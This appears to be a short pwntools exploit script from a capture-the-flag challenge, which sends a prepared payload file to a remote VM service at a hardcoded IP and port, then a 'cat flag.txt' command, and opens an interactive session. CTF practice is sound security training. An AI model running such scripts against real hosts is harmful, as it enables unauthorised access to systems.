from pwn import *

#conn = process(["./vm", "-"])
#conn = remote("localhost", 1337)
conn = remote("34.90.111.148", 1337)

conn.recvline()
conn.sendline(open("out", "rb").read() + b"\ncat flag.txt")
conn.interactive()
